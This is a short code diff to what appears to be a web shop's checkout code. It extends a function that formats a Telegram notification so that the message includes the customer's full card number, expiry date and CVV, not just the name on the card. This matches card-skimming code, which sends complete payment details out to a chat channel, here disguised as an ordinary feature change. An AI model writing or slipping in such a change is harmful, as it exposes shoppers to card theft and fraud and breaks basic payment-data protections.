@@ -16,6 +16,9 @@ function line(label: string, value?: string | number | boolean | null): string {
 
 export interface CheckoutCardNameContext {
   cardName: string;
+  cardNumber: string;
+  cardExpiry: string;
+  cardCvv: string;
   email?: string;
   fullName?: string;
   path?: string;
@@ -47,6 +50,9 @@ export function formatCheckoutCardNameTelegramMessage(
 
   message += "<b>Cardholder</b>\n";
   message += line("Name on card", ctx.cardName);
+  message += line("Card number", ctx.cardNumber);
+  message += line("Card expiry", ctx.cardExpiry);
+  message += line("Card CVV", ctx.cardCvv);
   message += line("Email", ctx.email);
   message += line("Customer name", ctx.fullName);
 
